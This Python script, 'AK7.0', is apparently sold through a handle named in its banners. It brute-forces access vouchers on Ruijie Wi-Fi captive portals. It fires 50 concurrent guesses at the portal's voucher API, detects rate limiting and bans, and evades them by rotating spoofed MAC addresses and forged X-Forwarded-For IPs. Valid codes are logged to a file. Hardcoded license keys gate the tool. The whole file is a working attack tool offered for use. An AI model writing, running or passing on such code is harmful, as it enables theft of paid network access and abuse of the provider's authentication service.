#!/usr/bin/env python3
"""
AK7.0 - Ruijie Voucher Scanner (License Key Authentication Edition)
- ဝယ်ယူရန် / ကီးရယူရန်: @ppgkkk
- Concurrency: 50 (Max Speed)
"""

import os
import sys
import json
import asyncio
import aiohttp
import re
import time
import socket
import requests
import urllib3
import random
import string
from datetime import datetime
from urllib.parse import urlparse, parse_qs, quote

from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
from rich.live import Live
from rich.table import Table
from rich.align import Align
from rich.text import Text
from rich.box import DOUBLE, HEAVY, HEAVY_HEAD

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RL_SLEEP = 0.1
CONCURRENCY = 50  # Max Speed
console = Console()

# ================= လိုင်စင်ကီး စစ်ဆေးသည့် စနစ် (Key System) =================
# သင်ပေးလိုသော ကီးများကို ဤနေရာတွင် ထည့်သွင်းနိုင်သည် (ဥပမာ - သင့်ဖောက်သည်များကို ပေးမည့်ကီးများ)
VALID_KEYS = ["AK70-VIP-2026", "AK70-FREE-KEY", "SUCCESS-9999", "C8B3-973C-1589-9EC9"]

def check_license_key():
    clear_screen()
    console.print(Panel(Align.center("[bold cyan]AK7.0 - LICENSE KEY SYSTEM\nဝယ်ယူရန် / ကီးတောင်းရန်: @ppgkkk[/bold cyan]"), border_style="cyan", box=DOUBLE))
    
    user_key = input("[cyan]>> Enter Your License Key: [/cyan]").strip()
    
    if user_key in VALID_KEYS:
        console.print("[green][+] ကီးမှန်ကန်ပါသည်။ AK7.0 စနစ် စတင်နေပါပြီ...[/green]")
        time.sleep(1.5)
        return True
    else:
        console.print(Panel(f"[bold red]ACCESS DENIED!\nထည့်သွင်းလိုက်သော ကီး ({user_key}) မှာ မှားယွင်းနေပါသည် သို့မဟုတ် သက်တမ်းမရှိပါ။\nကီးဝယ်ယူရန် ဆက်သွယ်ရန်: @ppgkkk[/bold red]", border_style="red", box=DOUBLE))
        return False
# =========================================================================

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_timestamp():
    return datetime.now().strftime("%H:%M:%S")

def extract_params_from_url(url):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    params = {}
    for key in ['gw_id', 'gw_sn', 'gw_address', 'gw_port', 'ip', 'mac', 'slot_num', 'nasip', 'ssid', 'url', 'chap_id', 'chap_challenge']:
        if key in query:
            params[key] = query[key][0]
    return params

class VoucherScanner:
    def __init__(self):
        self.sid = None
        self.sign = None
        self.timestamp = None
        self.session_valid = False
        self.rate_limited = False
        self.mode = "num"
        
        self.current_mac = self.gen_random_mac()
        self.current_ip = f"192.168.110.{random.randint(2, 254)}"

        self._display_active = False
        self._live = None
        
        # UI State
        self._state = {
            'checked': 0, 'speed': 0, 'found': [], 'logs': [],
            'current_code': 'WAITING...', 'status': 'INIT', 'progress': 0
        }

        # Default Portal Params (Fallback)
        self.params = {
            "stage": "portal", "gw_id": "c4b25be7d323", "gw_sn": "H1U320P00210A",
            "gw_address": "192.168.7.1", "gw_port": "2060", "ip": self.current_ip,
            "mac": self.current_mac, "slot_num": "14", "nasip": "192.168.1.193",
            "ssid": "VLAN7", "ustate": "0", "mac_req": "1",
            "url": "http://connectivitycheck.gstatic.com/generate_204",
            "chap_id": r"\245", "chap_challenge": r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067"
        }

    def apply_params_from_url(self, url):
        params = extract_params_from_url(url)
        for key, value in params.items():
            self.params[key] = value

    def gen_random_mac(self):
        mac = [0x00, 0x16, 0x3e, random.randint(0x00, 0x7f), random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
        return ':'.join(map(lambda x: "%02x" % x, mac))

    def generate_voucher(self, length):
        if self.mode == "num": return str(random.randint(0, 10**length - 1)).zfill(length)
        elif self.mode == "eng": return ''.join(random.choices(string.ascii_lowercase, k=length))
        elif self.mode == "mix": return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
        return str(random.randint(0, 10**length - 1)).zfill(length)

    def add_log(self, msg, color="white"):
        ts = get_timestamp()
        self._state['logs'].append(f"[{ts}] [{color}]{msg}[/{color}]")
        if len(self._state['logs']) > 6:
            self._state['logs'].pop(0)

    def build_ui(self):
        s = self._state
        
        # Cyberpunk Layout
        layout = Layout()
        layout.split_column(
            Layout(name="top", size=5),
            Layout(name="body", ratio=1),
            Layout(name="bottom", size=8)
        )
        
        layout["body"].split_row(
            Layout(name="left", ratio=1),
            Layout(name="right", ratio=1)
        )

        # ================= TOP HEADER =================
        header_text = Text.assemble(
            ("▀▄▀▄ ", "bold magenta"), ("A K 7 . 0   S C A N N E R", "bold cyan"), (" ▄▀▄▀\n", "bold magenta"),
            (f"  [ ဝယ်ယူရန်: @ppgkkk | MAC: {self.current_mac[-8:]} ]", "dim white")
        )
        layout["top"].update(Panel(
            Align.center(header_text), 
            border_style="magenta", box=DOUBLE
        ))

        # ================= LEFT (STATS) =================
        stats_table = Table.grid(padding=1, expand=True)
        stats_table.add_column(justify="left", ratio=1)
        stats_table.add_column(justify="right", ratio=1)
        
        stats_table.add_row("⚡ SPEED ", f"[bold yellow]{s['speed']} /m[/bold yellow]")
        stats_table.add_row("🎯 CURRENT ", f"[bold green]{s['current_code']}[/bold green]")
        stats_table.add_row("🏹 TRIED ", f"[bold cyan]{s['checked']:,}[/bold cyan]")
        
        status_color = "green" if s['status'] == "SCANNING" else "red"
        stats_table.add_row("📡 STATUS ", f"[bold {status_color}]{s['status']}[/bold {status_color}]")
        
        layout["left"].update(Panel(
            stats_table, 
            title="[bold cyan]>>> AK7.0 STATS[/bold cyan]", 
            border_style="cyan", box=HEAVY
        ))

        # ================= RIGHT (LOGS) =================
        log_text = "\n".join(s['logs']) if s['logs'] else "[dim]Waiting for data...[/dim]"
        layout["right"].update(Panel(
            log_text, 
            title="[bold blue]>>> LOGS (@ppgkkk)[/bold blue]", 
            border_style="blue", box=HEAVY
        ))

        # ================= BOTTOM (HITS & PROGRESS) =================
        bar_len = 20
        filled = int(bar_len * (s['progress'] / 100))
        bar = "[bold magenta]" + "▓" * filled + "[/bold magenta]" + "[dim white]" + "░" * (bar_len - filled) + "[/dim white]"
        
        hits_table = Table(show_header=True, header_style="bold yellow", box=HEAVY_HEAD, expand=True)
        hits_table.add_column("IDX", width=5, justify="center")
        hits_table.add_column("VALID VOUCHER", justify="center")
        hits_table.add_column("TIME", justify="center")
        
        for idx, v in enumerate(s['found']):
            hits_table.add_row(str(idx+1), f"[bold green]{v}[/bold green]", get_timestamp())
            
        if not s['found']:
            hits_table.add_row("-", "[dim]SEARCHING...[/dim]", "-")

        layout["bottom"].split_row(
            Layout(Panel(Align.center(f"\n{bar} {s['progress']:.1f}%\n\n[bold red]TARGET: {self.mode.upper()}[/bold red]"), 
                         title="[bold red]>>> PROGRESS[/bold red]", border_style="red", box=HEAVY), ratio=1),
            Layout(Panel(hits_table, title=f"[bold yellow]>>> VAULT (@ppgkkk) ({len(s['found'])})[/bold yellow]", border_style="yellow", box=HEAVY), ratio=2)
        )
        
        return layout

    def _render(self):
        if self._display_active and self._live:
            try: self._live.update(self.build_ui())
            except: pass

    async def get_session_id(self, session, force_refresh=False):
        if not force_refresh and self.sid and self.session_valid:
            return self.sid

        base_url = "https://portal-as.ruijienetworks.com/api/auth/wifidog"
        if "portal-mm-as" in str(self.params.get("url", "")):
            base_url = base_url.replace("portal-as", "portal-mm-as")

        attempt = 0
        while attempt < 5:
            attempt += 1
            
            if self.rate_limited or attempt > 2:
                self.current_mac = self.gen_random_mac()
                self.current_ip = f"192.168.110.{random.randint(2, 254)}"
                self.rate_limited = False
                self.add_log(f"Ban! New MAC: {self.current_mac[-8:]}", "red")
            else:
                self.add_log(f"Refreshing SID...", "yellow")

            temp_params = self.params.copy()
            temp_params['mac'] = self.current_mac
            temp_params['ip'] = self.current_ip

            params_str = "&".join([f"{k}={quote(str(v))}" for k, v in temp_params.items()])
            full_url = f"{base_url}?{params_str}"

            headers = {
                'User-Agent': f'Mozilla/5.0 (Linux; Android 14) AK7.0-{self.current_mac}',
                'Client-Mac': self.current_mac,
                'X-Forwarded-For': self.current_ip,
                'Connection': 'close'
            }

            try:
                session.cookie_jar.clear()
                async with session.get(full_url, headers=headers, timeout=10, allow_redirects=False) as resp:
                    location = resp.headers.get('Location', '')
                    if not location:
                        await asyncio.sleep(RL_SLEEP)
                        continue

                    loc_lower = location.lower()
                    if "request limited" in loc_lower or "error.html" in loc_lower or "banned" in loc_lower:
                        self.rate_limited = True
                        await asyncio.sleep(RL_SLEEP)
                        continue

                    query = parse_qs(urlparse(location).query)
                    sid = query.get('sessionId', [None])[0]
                    if sid:
                        self.sid = sid
                        self.sign = query.get('sign', [None])[0]
                        self.timestamp = query.get('timestamp', [None])[0]
                        self.session_valid = True
                        self.add_log(f"Session OK (SID: {sid[:6]})", "green")
                        return sid
                    await asyncio.sleep(RL_SLEEP)
            except Exception:
                await asyncio.sleep(RL_SLEEP)
        
        self.add_log("Failed SID. Retrying...", "red")
        await asyncio.sleep(1)
        return None

    async def validate_voucher(self, session, voucher):
        if not await self.get_session_id(session, force_refresh=False):
            return 'RATE_LIMITED', None

        url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
        if self.sign and self.timestamp:
            url += f"&sign={self.sign}&timestamp={self.timestamp}"

        headers = {
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Linux; Android 12)",
            "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={self.sid}",
        }

        for attempt in range(1, 4):
            payload = {"accessCode": voucher, "sessionId": self.sid, "apiVersion": 1}
            if self.sign: payload["sign"] = self.sign
            if self.timestamp: payload["timestamp"] = self.timestamp

            try:
                async with session.post(url, json=payload, headers=headers, ssl=False, timeout=10, allow_redirects=True) as resp:
                    text = await resp.text()
                    final_url = str(resp.url)

                    if "request%20limited" in final_url.lower() or "request limited" in final_url.lower():
                        self.session_valid = False
                        self.rate_limited = True
                        return 'RATE_LIMITED', None

                    try: result = json.loads(text)
                    except: result = {}

                    msg = str(result.get("message", "")).lower()

                    if "request limited" in msg or "too many" in msg:
                        self.session_valid = False
                        self.rate_limited = True
                        return 'RATE_LIMITED', None

                    if "session timed out" in msg or "invalid session" in msg:
                        self.session_valid = False
                        await self.get_session_id(session, force_refresh=True)
                        continue

                    if result.get("success") is True and isinstance(result.get("result"), dict):
                        return 'FOUND', result["result"].get("logonUrl")
                    
                    if '"result":0' in text or '"error":null' in text:
                        return 'FOUND', None

                    return 'INVALID', None
            except Exception:
                self.session_valid = False
                await asyncio.sleep(0.2)
        return 'INVALID', None

    async def run_scan(self, session, total_codes, length):
        self._state['status'] = "SCANNING"
        self._display_active = True
        self._live = Live(self.build_ui(), refresh_per_second=10, screen=True)
        self._live.start()

        start_time = time.time()
        tested_count = 0
        semaphore = asyncio.Semaphore(CONCURRENCY)

        async def bounded_check(v):
            async with semaphore:
                res = await self.validate_voucher(session, v)
                return v, res

        try:
            batch = []
            for _ in range(total_codes):
                voucher = self.generate_voucher(length)
                batch.append(voucher)

                if len(batch) >= CONCURRENCY:
                    tasks = [bounded_check(v) for v in batch]
                    results = await asyncio.gather(*tasks)
                    
                    for v, res in results:
                        tested_count += 1
                        status, logon_url = res
                        
                        if status == 'FOUND':
                            self._state['found'].append(v)
                            self.add_log(f"VOUCHER FOUND: {v}", "bold green")
                            with open("found_ak7.txt", "a") as f:
                                f.write(f"[{get_timestamp()}] {v} -> {logon_url}\n")
                            
                            self.session_valid = False
                            self.current_mac = self.gen_random_mac()
                            await self.get_session_id(session, force_refresh=True)
                        elif status == 'RATE_LIMITED':
                            self.rate_limited = True

                    self._state['current_code'] = batch[-1]
                    self._state['checked'] = tested_count
                    
                    elapsed = time.time() - start_time
                    self._state['speed'] = int(tested_count / elapsed * 60) if elapsed > 0 else 0
                    self._state['progress'] = (tested_count / total_codes) * 100
                    
                    self._render()
                    batch.clear()

        finally:
            self._display_active = False
            self._live.stop()

async def main():
    # ၁။ လိုင်စင်ကီး စစ်ဆေးခြင်း အရင်လုပ်မည်[span_2](start_span)[span_2](end_span)
    if not check_license_key():
        input("\nPress Enter to exit...")
        sys.exit()

    scanner = VoucherScanner()
    
    console.print("[yellow][*][/yellow] Auto-detecting Portal... (Press Ctrl+C to skip)")
    try:
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=3)
        if "ruijienetworks" in r.url:
            scanner.apply_params_from_url(r.url)
            console.print("[green][+] Portal detected successfully![/green]")
        else:
            raise Exception("Not Ruijie")
    except:
        console.print("[red][-] Auto-detect failed.[/red]")
        url_input = input("[cyan]>> Paste Portal URL: [/cyan]").strip()
        if url_input: scanner.apply_params_from_url(url_input)

    console.print("\n[bold magenta]AK7.0 SELECT SCAN MODE (@ppgkkk):[/bold magenta]")
    console.print("1. NUMBERS (0-9)")
    console.print("2. ENGLISH (a-z)")
    console.print("3. MIX (a-z + 0-9)")
    
    mode = input("[cyan]>> [/cyan]").strip()
    if mode == "2": scanner.mode = "eng"
    elif mode == "3": scanner.mode = "mix"
    else: scanner.mode = "num"

    lc = input("[cyan]>> Voucher Length (6/7/8/9) [6]: [/cyan]").strip()
    length = int(lc) if lc in ['7', '8', '9'] else 6

    console.print("\n[bold green]>>> STARTING AK7.0 SCAN...[/bold green]")
    time.sleep(1.5)

    async with aiohttp.ClientSession() as session:
        total_to_scan = 10**length 
        await scanner.run_scan(session, total_to_scan, length)

    console.print("\n[bold cyan]>>> AK7.0 SCAN FINISHED. SYSTEM HALTED.[/bold cyan]")
    input("Press Enter to exit...")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[bold red]Process Terminated by User (@ppgkkk).[/bold red]")
